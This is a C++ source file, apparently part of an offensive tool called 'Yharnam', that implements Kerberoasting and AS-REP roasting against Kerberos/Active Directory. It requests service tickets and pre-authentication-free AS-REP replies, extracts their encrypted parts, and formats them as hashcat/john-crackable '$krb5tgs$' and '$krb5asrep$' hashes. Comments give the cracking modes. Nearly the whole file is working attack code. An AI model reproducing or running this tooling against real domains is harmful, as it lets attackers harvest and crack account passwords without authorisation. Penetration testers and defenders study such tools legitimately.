#include "KerberosInteraction.h"
#include <iostream>
#include <stdexcept>
#include <cctype>
#include <cstdint>
#include <cstring>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <iterator>
#include <vector>
#include "protocols/KdcClient.h"

namespace {
// Encryption types Yharnam can extract a crackable hash for.
constexpr bool isSupportedEnctype(krb5_enctype etype) {
    return etype == ENCTYPE_AES128_CTS_HMAC_SHA1_96 ||
           etype == ENCTYPE_AES256_CTS_HMAC_SHA1_96 ||
           etype == ENCTYPE_ARCFOUR_HMAC;
}

// --- Minimal DER reader, just enough to walk an AS-REP / KRB-ERROR ---------
// ASN.1 tags use single-byte identifiers here (tag numbers < 31).
constexpr uint8_t kTagKrbError = 0x7e;  // [APPLICATION 30]
constexpr uint8_t kTagAsRep    = 0x6b;  // [APPLICATION 11]
constexpr uint8_t kTagSequence = 0x30;
constexpr uint8_t kTagInteger  = 0x02;
constexpr uint8_t kTagOctet    = 0x04;
constexpr uint8_t kCtx0        = 0xa0;  // enc-part etype  [0]
constexpr uint8_t kCtx2        = 0xa2;  // enc-part cipher [2]
constexpr uint8_t kCtxEncPart  = 0xa6;  // KDC-REP enc-part [6]

struct Tlv {
    uint8_t tag = 0;
    const uint8_t* val = nullptr;  // start of contents
    size_t len = 0;                // length of contents
    const uint8_t* next = nullptr; // first byte after this element
};

// Reads one tag-length-value triple starting at [p, end). Returns false on a
// truncated or malformed element.
bool readTlv(const uint8_t* p, const uint8_t* end, Tlv& out) {
    if (p >= end) return false;
    out.tag = *p++;
    if (p >= end) return false;

    size_t len = *p++;
    if (len & 0x80) {  // long form
        const int n = len & 0x7f;
        if (n == 0 || n > 4 || p + n > end) return false;
        len = 0;
        for (int i = 0; i < n; ++i) len = (len << 8) | *p++;
    }
    if (len > static_cast<size_t>(end - p)) return false;

    out.val = p;
    out.len = len;
    out.next = p + len;
    return true;
}

struct AsRepEncPart {
    bool ok = false;
    bool kdcError = false;
    krb5_enctype etype = 0;
    const uint8_t* cipher = nullptr;
    size_t cipherLen = 0;
};

// Reads the etype [0] and cipher [2] out of an EncryptedData SEQUENCE.
bool parseEncryptedData(const Tlv& encPartField, AsRepEncPart& result) {
    Tlv edSeq;
    if (!readTlv(encPartField.val, encPartField.val + encPartField.len, edSeq) ||
        edSeq.tag != kTagSequence) {
        return false;
    }

    bool haveEtype = false;
    for (const uint8_t* p = edSeq.val; ; ) {
        Tlv field;
        if (!readTlv(p, edSeq.val + edSeq.len, field)) break;
        p = field.next;

        if (field.tag == kCtx0) {  // etype [0] -> INTEGER
            Tlv intVal;
            if (readTlv(field.val, field.val + field.len, intVal) && intVal.tag == kTagInteger) {
                krb5_enctype etype = 0;
                for (size_t i = 0; i < intVal.len; ++i) etype = (etype << 8) | intVal.val[i];
                result.etype = etype;
                haveEtype = true;
            }
        } else if (field.tag == kCtx2) {  // cipher [2] -> OCTET STRING
            Tlv octet;
            if (readTlv(field.val, field.val + field.len, octet) && octet.tag == kTagOctet) {
                result.cipher = octet.val;
                result.cipherLen = octet.len;
            }
        }
    }

    return haveEtype && result.cipher != nullptr;
}

// Extracts the AS-REP enc-part (etype + cipher) from a raw KDC reply.
AsRepEncPart parseAsRep(const uint8_t* data, size_t dataLen) {
    AsRepEncPart result;
    const uint8_t* end = data + dataLen;

    Tlv outer;
    if (!readTlv(data, end, outer)) return result;
    if (outer.tag == kTagKrbError) {
        result.kdcError = true;
        return result;
    }
    if (outer.tag != kTagAsRep) return result;

    Tlv seq;
    if (!readTlv(outer.val, outer.val + outer.len, seq) || seq.tag != kTagSequence) {
        return result;
    }

    // Walk the KDC-REP fields looking for enc-part [6].
    for (const uint8_t* fp = seq.val; ; ) {
        Tlv field;
        if (!readTlv(fp, seq.val + seq.len, field)) break;
        fp = field.next;

        if (field.tag == kCtxEncPart) {
            result.ok = parseEncryptedData(field, result);
            break;
        }
    }

    return result;
}
}  // namespace

KerberosInteraction::KerberosInteraction() {
    krb5_context ctx = nullptr;
    krb5_error_code err = krb5_init_context(&ctx);
    if (err || !ctx)
        throw std::runtime_error("Failed to initialize Kerberos context");
    context_.reset(ctx);
}

bool KerberosInteraction::requestAndCacheTGT(const std::string& username, const std::string& password) {
    auto creds = requestRawTGT(username, password);
    if (!creds) {
        return false;
    }
    
    return cacheTicket(*creds, username);
}

std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> KerberosInteraction::requestRawTGT(
    const std::string& username, 
    const std::string& password
) {
    if (!context_) {
        std::cerr << "[-] No krb5 context initialized\n";
        return nullptr;
    }

    auto principal = parsePrincipal(username);
    if (!principal) {
        return nullptr;
    }

    std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> creds = obtainInitialCredentials(
        principal.get(), 
        password
    );
    if (!creds) {
        return nullptr;
    }

    std::cout << "[+] Successfully obtained TGT for " << username << std::endl;
    return creds;
}

bool KerberosInteraction::cacheTicket(const krb5_creds& creds, const std::string& username) {
    if (!context_) {
        std::cerr << "[-] No krb5 context initialized\n";
        return false;
    }

    auto principal = parsePrincipal(username);
    if (!principal) {
        return false;
    }

    auto cache = openDefaultCache();
    if (!cache) {
        return false;
    }

    if (!initializeCache(cache.get(), principal.get())) {
        return false;
    }
    
    if (!storeInCache(cache.get(), creds)) {
        return false;
    }

    std::cout << "[+] Successfully cached TGT for " << username << std::endl;
    return true;
}

std::string KerberosInteraction::requestAndFormatTGS(const std::string& spn, const std::string& user_requesting) {
    auto userPrincipal = parsePrincipal(user_requesting);
    if (!userPrincipal) {
        std::cerr << "[-] Failed to parse user principal: " << user_requesting << std::endl;
        return "";
    }

    auto servicePrincipal = parsePrincipal(spn);
    if (!servicePrincipal) {
        std::cerr << "[-] Failed to parse service principal: " << spn << std::endl;
        return "";
    }

    krb5_principal_data* userPrincipalPtr = userPrincipal.release();
    krb5_principal_data* servicePrincipalPtr = servicePrincipal.release();  
    auto requestCreds = prepareServiceRequest(userPrincipalPtr, servicePrincipalPtr);
    if (!requestCreds) {
        return "";
    }

    auto cache = openDefaultCache();
    if (!cache) {
        return "";
    }

    auto retrievedCreds = requestRawTGS(cache.get(), requestCreds.get());
    if (!retrievedCreds) {
        std::cerr << "[-] Failed to request TGS for " << spn << std::endl;
        return "";
    }

    std::cout << "[+] Requested TGS for " << spn << std::endl;
    
    if (retrievedCreds && retrievedCreds->ticket.length > 0) {
        std::string hashcat_ticket = KerberosTicketFormatter::formatTicket_TGS(
            context_.get(),
            *retrievedCreds.get()
        );
        return hashcat_ticket;
    } else {
        std::cerr << "[-] Retrieved credentials structure is empty or has no ticket data" << std::endl;
    }

    return "";
}

std::string KerberosInteraction::requestAndFormatASREP(
    const std::string& username,
    const std::string& realm,
    const std::string& kdcHost
) {
    std::string upperRealm = realm;
    std::transform(upperRealm.begin(), upperRealm.end(), upperRealm.begin(), ::toupper);

    auto principal = parsePrincipal(username + "@" + upperRealm);
    if (!principal) {
        return "";
    }

    // Offer AES (preferred) then RC4 in the AS-REQ etype list; the KDC returns
    // the strongest key the account holds and formatASREP adapts to it. AES
    // (etype 17/18) hashes crack with `john --format=krb5asrep`; RC4 (etype 23)
    // with `hashcat -m 18200` (RC4 needs the account to hold an RC4 key and the
    // local krb5 to permit it via allow_weak_crypto = true).
    krb5_get_init_creds_opt* options = nullptr;
    if (krb5_get_init_creds_opt_alloc(context_.get(), &options)) {
        return "";
    }
    krb5_enctype etypes[] = {
        ENCTYPE_AES256_CTS_HMAC_SHA1_96,
        ENCTYPE_AES128_CTS_HMAC_SHA1_96,
        ENCTYPE_ARCFOUR_HMAC,
    };
    krb5_get_init_creds_opt_set_etype_list(options, etypes, std::size(etypes));

    krb5_init_creds_context icc = nullptr;
    krb5_error_code err = krb5_init_creds_init(
        context_.get(), principal.get(), nullptr, nullptr, 0, options, &icc);
    if (err) {
        std::cerr << "[-] Failed to start AS-REQ for " << username << ": "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        krb5_get_init_creds_opt_free(context_.get(), options);
        return "";
    }

    // First step (empty input) yields the AS-REQ bytes; we transport them
    // ourselves and never feed the reply back, so no password is needed.
    krb5_data in{};
    krb5_data out{};
    krb5_data realmData{};
    unsigned int flags = 0;
    err = krb5_init_creds_step(context_.get(), icc, &in, &out, &realmData, &flags);

    std::string hash;
    if (!err && out.length > 0) {
        auto reply = KdcClient::exchange(
            kdcHost, 88, reinterpret_cast<const uint8_t*>(out.data), out.length);

        if (!reply) {
            std::cerr << "[-] Could not reach KDC at " << kdcHost << ":88" << std::endl;
        } else {
            AsRepEncPart encPart = parseAsRep(reply->data(), reply->size());
            if (encPart.kdcError) {
                std::cerr << "[-] KDC rejected AS-REQ for " << username
                          << " (pre-auth required, no matching etype, or unknown account)" << std::endl;
            } else if (encPart.ok) {
                hash = KerberosTicketFormatter::formatASREP(
                    username, upperRealm, encPart.etype, encPart.cipher, encPart.cipherLen);
            } else {
                std::cerr << "[-] Could not parse AS-REP for " << username << std::endl;
            }
        }
    } else if (err) {
        std::cerr << "[-] Failed to build AS-REQ for " << username << ": "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
    }

    krb5_free_data_contents(context_.get(), &out);
    krb5_free_data_contents(context_.get(), &realmData);
    krb5_init_creds_free(context_.get(), icc);
    krb5_get_init_creds_opt_free(context_.get(), options);

    return hash;
}

std::unique_ptr<krb5_principal_data, Krb5PrincipalDeleter> KerberosInteraction::parsePrincipal(
    const std::string& principalName
) {
    krb5_principal principal = nullptr;
    krb5_error_code err = krb5_parse_name(context_.get(), principalName.c_str(), &principal);
    
    if (err) {
        std::cerr << "[-] Failed to parse name '" << principalName << "': "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return std::unique_ptr<krb5_principal_data, Krb5PrincipalDeleter>{
        principal, Krb5PrincipalDeleter{context_.get()}
    };
}

std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> KerberosInteraction::obtainInitialCredentials(
    krb5_principal principal,
    const std::string& password
) {
    krb5_creds* raw_creds = new krb5_creds();
    std::memset(raw_creds, 0, sizeof(krb5_creds));

    std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> creds{
        raw_creds, Krb5UserCredsDeleter{context_.get()}
    };

    krb5_error_code err = krb5_get_init_creds_password(
        context_.get(),
        creds.get(),
        principal,
        password.c_str(),
        nullptr, 
        nullptr, 
        0, 
        nullptr, 
        nullptr
    );
    
    if (err) {
        std::cerr << "[-] Failed to request TGT: "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return creds;
}

std::unique_ptr<_krb5_ccache, Krb5CcacheDeleter> KerberosInteraction::openDefaultCache() {
    krb5_ccache cache = nullptr;
    krb5_error_code err = krb5_cc_default(context_.get(), &cache);
    
    if (err) {
        std::cerr << "[-] Failed to get default ccache: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return std::unique_ptr<_krb5_ccache, Krb5CcacheDeleter>(
        cache, Krb5CcacheDeleter{context_.get()}
    );
}

bool KerberosInteraction::initializeCache(krb5_ccache cache, krb5_principal principal) {
    krb5_error_code err = krb5_cc_initialize(context_.get(), cache, principal);
    
    if (err) {
        std::cerr << "[-] Failed to initialize ccache: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return false;
    }
    
    return true;
}

bool KerberosInteraction::storeInCache(krb5_ccache cache, const krb5_creds& creds) {
    krb5_error_code err = krb5_cc_store_cred(
        context_.get(), 
        cache, 
        const_cast<krb5_creds*>(&creds)
    );
    
    if (err) {
        std::cerr << "[-] Failed to store credentials: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return false;
    }
    
    return true;
}

std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> KerberosInteraction::prepareServiceRequest(
    krb5_principal userPrincipal,
    krb5_principal servicePrincipal
) {
    krb5_creds* raw_creds = new krb5_creds();
    std::memset(raw_creds, 0, sizeof(krb5_creds));
    
    std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> cred{ 
        raw_creds, Krb5UserCredsDeleter{ context_.get() } 
    };
    
    cred.get()->client = userPrincipal;
    cred.get()->server = servicePrincipal;

    return cred;
}

std::unique_ptr<krb5_creds, Krb5LibraryCredsDeleter> KerberosInteraction::requestRawTGS(
    krb5_ccache cache,
    krb5_creds* requestTemplate
) {
    krb5_creds* out = nullptr;

    krb5_error_code err = krb5_get_credentials(
        context_.get(), 
        0, 
        cache, 
        requestTemplate, 
        &out
    );

    if (err) {
        std::cerr << "[-] Failed to retrieve service credentials: "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return std::unique_ptr<krb5_creds, Krb5LibraryCredsDeleter>(
        out, Krb5LibraryCredsDeleter{context_.get()}
    );
}

std::string KerberosTicketFormatter::formatTicket_TGS(krb5_context ctx, const krb5_creds& creds) {
    std::string client_full = principal_to_string(ctx, creds.client);
    std::string server_full = principal_to_string(ctx, creds.server);

    if (client_full.empty() || server_full.empty()) {
        std::cerr << "[-] Could not unparse client or server name" << std::endl;
        return "";
    }

    std::string server_name, server_realm;
    split_principal(server_full, server_name, server_realm);

    const unsigned char* ticket_data = (const unsigned char*)creds.ticket.data;
    size_t ticket_len = creds.ticket.length;
    
    auto cipherLoc = findCipherInTicket(ticket_data, ticket_len);
    if (!cipherLoc) {
        std::cerr << "[-] Could not find cipher OCTET STRING in ticket" << std::endl;
        return "";
    }

    auto etype = findEncryptionType(ticket_data, cipherLoc->offset);
    if (!etype) {
        std::cerr << "[-] Could not find valid encryption type in ticket" << std::endl;
        return "";
    }

    size_t checksum_size = getChecksumSize(*etype);
    if (cipherLoc->length < checksum_size) {
        std::cerr << "[-] Cipher too small for checksum. "
                  << "Got " << cipherLoc->length << " bytes, need at least " << checksum_size << std::endl;
        return "";
    }

    std::string checksum_hex = to_hex(cipherLoc->start, checksum_size);
    std::string enc_data_hex = to_hex(cipherLoc->start + checksum_size, cipherLoc->length - checksum_size);

    return buildTGSHash(server_name, server_realm, *etype, checksum_hex, enc_data_hex);
}

std::string KerberosTicketFormatter::formatTicket_TGT(
    krb5_context ctx, 
    const krb5_creds& creds
) {
    std::string username_full = principal_to_string(ctx, creds.client);
    if (username_full.empty()) {
        std::cerr << "[-] Could not unparse client name" << std::endl;
        return "";
    }

    std::string username, realm;
    split_principal(username_full, username, realm);

    const unsigned char* ticket_data = (const unsigned char*)creds.ticket.data;
    size_t ticket_len = creds.ticket.length;

    auto cipherLoc = findCipherInTicket(ticket_data, ticket_len);
    if (!cipherLoc) {
        std::cerr << "[-] Could not find cipher in TGT" << std::endl;
        return "";
    }

    auto etype = findEncryptionType(ticket_data, cipherLoc->offset);
    if (!etype) {
        std::cerr << "[-] Could not find valid etype in TGT" << std::endl;
        return "";
    }

    size_t checksum_size = getChecksumSize(*etype);
    if (cipherLoc->length < checksum_size) {
        std::cerr << "[-] Cipher too small" << std::endl;
        return "";
    }

    std::string checksum_hex = to_hex(cipherLoc->start, checksum_size);
    std::string enc_data_hex = to_hex(cipherLoc->start + checksum_size, cipherLoc->length - checksum_size);

    return buildASREPHash(username, realm, *etype, checksum_hex, enc_data_hex);
}

std::string KerberosTicketFormatter::principal_to_string(
    krb5_context context, 
    krb5_principal principal
) {
    char* name_buf = nullptr;
    krb5_error_code ret = krb5_unparse_name(context, principal, &name_buf);

    if (ret) {
        return "";
    }

    std::string name_str(name_buf);
    krb5_free_unparsed_name(context, name_buf); 
    return name_str;
}

void KerberosTicketFormatter::split_principal(
    const std::string& full_principal, 
    std::string& name, 
    std::string& realm
) {
    size_t at_pos = full_principal.find('@');
    if (at_pos == std::string::npos) {
        name = full_principal;
        realm = "";
    } else {
        name = full_principal.substr(0, at_pos);
        realm = full_principal.substr(at_pos + 1);
    }
}

std::optional<KerberosTicketFormatter::CipherLocation> 
KerberosTicketFormatter::findCipherInTicket(
    const unsigned char* ticket_data,
    size_t ticket_len
) {
    if (ticket_len < 5) {
        return std::nullopt;
    }
    for (size_t i = 0; i + 4 < ticket_len; i++) {
        if (ticket_data[i] == 0x04 && (ticket_data[i+1] == 0x82)) {
            size_t len = (ticket_data[i+2] << 8) | ticket_data[i+3];
            
            if (len > 1000) {
                CipherLocation loc;
                loc.start = ticket_data + i + 4;
                loc.length = len;
                loc.offset = i;
                return loc;
            }
        }
    }
    return std::nullopt;
}

std::optional<krb5_enctype> KerberosTicketFormatter::findEncryptionType(
    const unsigned char* ticket_data,
    size_t cipher_offset
) {
    if (cipher_offset == 0) {
        return std::nullopt;
    }
    size_t search_start = (cipher_offset > 100) ? cipher_offset - 100 : 0;

    for (size_t i = cipher_offset - 1; i > search_start; i--) {
        if (ticket_data[i] == 0x02 && i + 2 < cipher_offset) {
            size_t int_len = ticket_data[i + 1];
            
            if (int_len == 1) {
                krb5_enctype potential_etype = ticket_data[i + 2];
                if (isSupportedEnctype(potential_etype)) {
                    return potential_etype;
                }
            } else if (int_len == 2 && i + 3 < cipher_offset) {
                krb5_enctype potential_etype = (ticket_data[i + 2] << 8) | ticket_data[i + 3];
                if (isSupportedEnctype(potential_etype)) {
                    return potential_etype;
                }
            }
        }
    }
    return std::nullopt;
}

inline size_t KerberosTicketFormatter::getChecksumSize(krb5_enctype etype) {
    switch (etype) {
        case ENCTYPE_AES128_CTS_HMAC_SHA1_96:
        case ENCTYPE_AES256_CTS_HMAC_SHA1_96:
            return 12;
        case ENCTYPE_ARCFOUR_HMAC:  // RC4-HMAC
            return 16;
        default:
            return 0;
    }
}

std::string KerberosTicketFormatter::to_hex(const unsigned char* data, size_t len) {
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (size_t i = 0; i < len; ++i) {
        ss << std::setw(2) << static_cast<unsigned>(data[i]);
    }
    return ss.str();
}

std::string KerberosTicketFormatter::buildTGSHash(
    const std::string& serverName,
    const std::string& serverRealm,
    krb5_enctype etype,
    const std::string& checksumHex,
    const std::string& encDataHex
) {
    std::string realm_lower = serverRealm;
    std::transform(realm_lower.begin(), realm_lower.end(), realm_lower.begin(), ::tolower);
    std::string spn_field = realm_lower + "/" + serverName;

    std::stringstream ss_hash;
    ss_hash << "$krb5tgs$" << etype << "$*"
        << serverName << "$" << serverRealm << "$"
        << spn_field << "*$"
        << checksumHex << "$" << encDataHex;

    return ss_hash.str();
}

std::string KerberosTicketFormatter::buildASREPHash(
    const std::string& username,
    const std::string& realm,
    krb5_enctype etype,
    const std::string& checksumHex,
    const std::string& encDataHex
) {
    std::stringstream ss_hash;
    ss_hash << "$krb5asrep$" << etype << "$"
            << username << "@" << realm << ":"
            << checksumHex << "$" << encDataHex;

    return ss_hash.str();
}

std::string KerberosTicketFormatter::formatASREP(
    const std::string& username,
    const std::string& realm,
    krb5_enctype etype,
    const unsigned char* cipher,
    size_t cipherLen
) {
    const size_t checksumSize = getChecksumSize(etype);
    if (checksumSize == 0 || cipherLen < checksumSize) {
        std::cerr << "[-] Unsupported or truncated AS-REP cipher (etype " << etype << ")" << std::endl;
        return "";
    }

    // For RC4-HMAC the 16-byte HMAC checksum precedes the encrypted data.
    std::string checksumHex = to_hex(cipher, checksumSize);
    std::string encDataHex = to_hex(cipher + checksumSize, cipherLen - checksumSize);

    return buildASREPHash(username, realm, etype, checksumHex, encDataHex);
}